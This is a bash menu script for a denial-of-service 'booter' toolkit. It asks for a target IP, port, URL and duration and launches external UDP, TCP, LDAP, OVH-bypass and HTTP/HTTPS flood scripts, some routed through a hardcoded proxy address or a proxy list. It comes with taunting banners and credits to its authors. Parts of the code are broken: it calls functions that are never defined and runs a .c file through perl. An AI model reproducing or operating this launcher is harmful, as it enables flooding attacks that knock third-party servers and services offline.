#!/bin/bash
BLACK='\e[0;30m'
CYAN='\e[0;34m'
CYAN='\e[0;32m'
CYAN='\e[0;36m'
RED='\e[0;31m'
CYAN='\e[0;35m'
RED='\e[0;33m'
CYAN='\e[0;37m'
CYAN='\e[1;30m'
CYAN='\e[1;34m'
CYAN='\e[1;32m'
BLUE='\e[1;36m'
CYAN='\e[1;31m'
CYAN='\e[1;35m'
CYAN='\e[1;33m'
CYAN='\e[0;37m'
CYAN='\e[1;37m'
PINK='\e[1;35m'
GREEN='\e[1;32m'
NC='\e[0m'              # No Color
# Trap Signal Script
#
#TitaniumScript.bypass//BASH  Bypass.Function
#load
exit_script()
{
  echo "* * *Trap * * *"
  ./m
}

dstat1()
{
    clear
    echo -e " ${CYAN}
  ┌───────────────────────────────────────────────────────────────────────┐
  │                        \033[1;91mDSTAT${CYAN}                                          │
  └───────────────────────────────────────────────────────────────────────┘
"
dstat
}

admin12()
{
    clear
    echo -e " ${GREEN} "
	echo "  +-----------------------------------------------------------------------+ "
    echo "  ���                       EAT MY SHINY ASS                              ��� "
    echo "  +-----------------------------------------------------------------------+ "                                                         
echo ":3"
echo ""
echo "ENTER BLOODCLOT'S IP :"
read ip
echo "PORT :"
read port
echo "TIME :"
read time
python gott.2.py $ip $port $time
}

credits(){
clear
echo -e " ${CYAN}
  ┌────────────────────────────────────────────────────────────────────────────┐
  │                         \033[1;91mCREDITS${CYAN}                                            │
  └────────────────────────────────────────────────────────────────────────────┘
  ┌────────────────────────────────────────────────────────────────────────────┐
  │                            JAGER: MENU BASE                                │
  │                            \033[1;91mNEGAN${CYAN}: HELPER                                   │
  │                            \033[1;91mISOLATION XY${CYAN}: EDITOR                            │
  └────────────────────────────────────────────────────────────────────────────┘
  ┌────────────────────────────────────────────────────────────────────────────┐
  │                         \033[1;91mMY BOIS${CYAN}                                            │
  └────────────────────────────────────────────────────────────────────────────┘
  ┌────────────────────────────────────────────────────────────────────────────┐
  │               FBI SCARECROW                                                │
  │               YFN                                                          │
  │               YOURDOGISPHIL                                                │
  │               XNIJIXISO                                                    │
  │               ALPHY                                                        │
  │               PLUS.BEST                                                    │
  │               R6BEAST                                                      │
  │               INSANITY                                                     │
  └────────────────────────────────────────────────────────────────────────────┘
"
}

udp_flooda(){
echo -en "
┌─────────────────────┐
│ IP : "
read ip
echo -en "
│ PORT : "
read port
echo -en "
│ TIME : "
read time
python gott.2.py ${ip} ${port} ${time}
}

udp_floodb(){
echo -en "
┌─────────────────────┐
│ IP : "
read ip
echo -en "
│ PORT : "
read port
echo -en "
│ PACKETS [65500] : "
read packets
echo -en "
│ TIME : "
read time
python gott.1.py ${ip} ${port} ${packets} ${time}
}

ldap(){
echo -en "
┌─────────────────────┐
│ IP : "
read ip
echo -en "
│ PORT : "
read port
echo -en "
│ TIME : "
read time
perl gott.3.pl ${ip} ${port} ${time}
}

xsshex(){
echo -en "
┌─────────────────────┐
│ IP : "
read ip
echo -en "
│ PORT : "
read port
echo -en "
│ PACKETS [65500] : "
read packets
echo -en "
│ TIME : "
read time
perl gott.4.pl ${ip} ${port} ${packets} ${time}
}

privbypass(){
echo -en "
┌─────────────────────┐
│ HOST : "
read ip
echo -en "
│ TIME : "
read time
perl gott.5.pl ${ip} ${time}
}

http(){
echo -en "
┌─────────────────────┐
│ URL : "
read url
perl gott.6.pl ${url} 1000 50 100
}

http2(){
echo -en "
┌─────────────────────┐
│ URL : "
read url
perl gott.13.pl ${url} 9999 1000 GET 82.137.20.145:8080
}

http3(){
echo -en "
┌─────────────────────┐
│ URL : "
read url
perl gott.13.pl ${url} 9999 1000 GET proxies.txt:8080
}

speedtest(){
python speedtest.py
}

snake(){
python snake.py
}

cortex(){
perl gott.7.c
}

x8g7(){
echo -en "
┌─────────────────────┐
│ IP : "
read ip
echo -en "
│ PORT : "
read port
echo -en "
│ TIME : "
read time
perl gott.8.pl ${ip} ${port} 65500 ${time}
}

https(){
echo -en "
┌─────────────────────┐
│ URL : "
read url
perl gott.9.pl ${url} 400 200 8.8.8.8
}

https2(){
echo -en "
┌─────────────────────┐
│ URL : "
read url
perl gott.9.pl ${url} 1000 200 8.8.8.8
}

fbi(){
echo -en "
┌─────────────────────┐
│ IP : "
read ip
echo -en "
│ PORT : "
read port
echo -en "
│ TIME : "
read time
perl gott.10.pl ${ip} ${port} 65500 ${time}
}

std(){
echo -en "
┌─────────────────────┐
│ HOST : "
read host
echo -en "
│ PORT : "
read port
./gott.11 ${host} ${port}
}

users(){
top
}

ovh(){
echo -en "
┌─────────────────────┐
│ IP : "
read ip
echo -en "
│ PORT : "
read port
./HiperOVH ${ip} ${port}
}

flood(){
echo -en "
┌─────────────────────┐
│ IP : "
read ip
echo -en "
│ PORT : "
read port
echo -en "
│ PACKETS [65500] : "
read packets
echo -en "
│ TIME : "
read time
python gott.14.py ${ip} ${port} ${packets} ${time}
}

_l4()
{
clear
while :
do
clear;clear
echo -en "

\033[1;91m┌──────────────────────────────────┐
\033[1;91m│${CYAN} [1] UDP                          \033[1;91m│
\033[1;91m│${CYAN} [2] TCP                          \033[1;91m│
\033[1;91m│${CYAN} [R] RETURN MAIN MENU             \033[1;91m│
\033[1;91m└──────────────────────────────────┘
${CYAN}[\033[1;91mY A T O${CYAN}]-家 "
    read yourch
    case $yourch in
      1) _udp ;;
      2) _tcp ;;
	  R) Take_input1 ;;
      *) echo "INVALID SELECTION," ;
         echo "PRESS ENTER." ; read ;;
 esac
done
}

trap exit_script 2

Take_l4

_udp()
{
clear
while :
do
clear;clear
echo -en "

\033[1;91m┌──────────────────────────────────┐
\033[1;91m│${CYAN} [1] UDP SLAM 1                   \033[1;91m│
\033[1;91m│${CYAN} [2] UDP SLAM 2                   \033[1;91m│
\033[1;91m│${CYAN} [3] PRIV UDP                     \033[1;91m│
\033[1;91m│${CYAN} [4] FBI UDP                      \033[1;91m│
\033[1;91m│${CYAN} [5] LDAP                         \033[1;91m│
\033[1;91m│${CYAN} [6] STD                          \033[1;91m│
\033[1;91m│${CYAN} [7] XSSHEX                       \033[1;91m│
\033[1;91m│${CYAN} [R] RETURN                       \033[1;91m│
\033[1;91m└──────────────────────────────────┘
${CYAN}[\033[1;91mY A T O${CYAN}]-家 "
    read yourch
    case $yourch in
      1) udp_flooda ;;
      2) udp_floodb ;;
	  3) x8g7 ;;
	  4) fbi ;;
	  5) ldap ;;
	  6) std ;;
	  7) xsshex ;;
	  R) _l4 ;;
      *) echo "INVALID SELECTION," ;
         echo "PRESS ENTER." ; read ;;
 esac
done
}

trap exit_script 2

Take_udp

_tcp()
{
clear
while :
do
clear;clear
echo -en "

\033[1;91m┌──────────────────────────────────┐
\033[1;91m│${CYAN} [1] PRIVATE BYPASS               \033[1;91m│
\033[1;91m│${CYAN} [2] OVH METHOD                   \033[1;91m│
\033[1;91m│${CYAN} [3] TCP FLOOD                    \033[1;91m│
\033[1;91m│${CYAN} [R] RETURN                       \033[1;91m│
\033[1;91m└──────────────────────────────────┘
${CYAN}[\033[1;91mY A T O${CYAN}]-家 "
    read yourch
    case $yourch in
	  1) privbypass ;;
	  2) ovh ;;
	  3) flood ;;
	  R) _l4 ;;
      *) echo "INVALID SELECTION," ;
         echo "PRESS ENTER." ; read ;;
 esac
done
}

trap exit_script 2

Take_tcp

_l7()
{
clear
while :
do
clear;clear
echo -en "

\033[1;91m┌──────────────────────────────────┐
\033[1;91m│${CYAN} [1] PROXIE TUT                   \033[1;91m│
\033[1;91m│${CYAN} [2] HTTP FLOOD 1                 \033[1;91m│
\033[1;91m│${CYAN} [3] HTTP FLOOD 2                 \033[1;91m│
\033[1;91m│${CYAN} [4] HTTP FLOOD 3                 \033[1;91m│
\033[1;91m│${CYAN} [5] HTTPS FLOOD 1                \033[1;91m│
\033[1;91m│${CYAN} [6] HTTPS FLOOD 2                \033[1;91m│
\033[1;91m│${CYAN} [R] RETURN MAIN MENU             \033[1;91m│
\033[1;91m└──────────────────────────────────┘
${CYAN}[\033[1;91mY A T O${CYAN}]-家 "
    read yourch
    case $yourch in
	  1) echo "HTTP METHOD 3: TO GET PROXIES GO TO proxyscrape.com" ;
	      echo "RENAME FILE TO proxies.txt AND ADD THEM TO THE VPS." ; exit 1 ;;
	  2) http ;;
	  3) http2 ;;
	  4) http3 ;;
	  5) https ;;
	  6) https2 ;;
	  R) Take_input1 ;;
      *) echo "INVALID SELECTION," ;
         echo "PRESS ENTER." ; read ;;
 esac
done
}

trap exit_script 2

Take_l7

exit_script1()
{
  exit 1
}

Take_input1()
{
clear
while :
do
clear;clear
echo -en "
██╗   ██╗     █████╗     ████████╗ ██████╗
╚██╗ ██╔╝    ██╔══██╗    ╚══██╔══╝██╔═══██╗
 ╚████╔╝     ███████║       ██║   ██║   ██║
  ╚██╔╝      ██╔══██║       ██║   ██║   ██║
   ██║       ██║  ██║       ██║   ╚██████╔╝ ⿆⾐
   ╚═╝       ╚═╝  ╚═╝       ╚═╝    ╚═════╝
              \033[1;91m罪 深 い Kon'nichiwa\033[00m

\033[1;91m┌──────────────────────────────────┐
\033[1;91m│${CYAN} [1] L4                           \033[1;91m│
\033[1;91m│${CYAN} [2] l7                           \033[1;91m│
\033[1;91m│${CYAN} [3] CORTEX SCRIPT                \033[1;91m│
\033[1;91m│${CYAN} [4] SNAKE GAME                   \033[1;91m│
\033[1;91m│${CYAN} [5] SPEEDTEST                    \033[1;91m│
\033[1;91m│${CYAN} [6] DSTAT 1                      \033[1;91m│
\033[1;91m│${CYAN} [7] DSTAT 2                      \033[1;91m│
\033[1;91m│${CYAN} [8] USERS                        \033[1;91m│
\033[1;91m│${CYAN} [9] RECENT IPS                   \033[1;91m│
\033[1;91m│${CYAN} [CTRL+C] TO STOP SLAMMING SKIDS. \033[1;91m│
\033[1;91m│${CYAN} [C] CREDITS.                     \033[1;91m│
\033[1;91m│${CYAN} [I] INFO.                        \033[1;91m│
\033[1;91m│${CYAN} [X] CLOSE.                       \033[1;91m│
\033[1;91m└──────────────────────────────────┘
${CYAN}[\033[1;91mY A T O${CYAN}]-家 "
    read yourch
    case $yourch in
	  1) _l4 ;;
	  2) _l7 ;;
	  3) cortex ; exit 1 ;;
	  4) snake ;;
	  5) speedtest ;;
	  6) vnstat -l -i eth0 ;;
	  7) dstat1 ;;
	  8) users ;;
	  9) last ; exit 1 ;;
	  C) credits ; exit 1 ;;
	  I) echo "ALL SCRIPTS HAVE BEEN TESTED AND WORKS ON DEBIAN :)" ; exit 1 ;;
	  X) exit 1  ;;
      *) echo "INVALID SELECTION," ;
         echo "PRESS ENTER." ; read ;;
 esac
done # end_while
}
#
# Set trap to for CTRL+C interrupt i.e. Install our error handler
# When occurs it first it calls del_file() and then exit
#
trap exit_script 2
#
# Call our user define function : Take_inpt1
#

Take_input1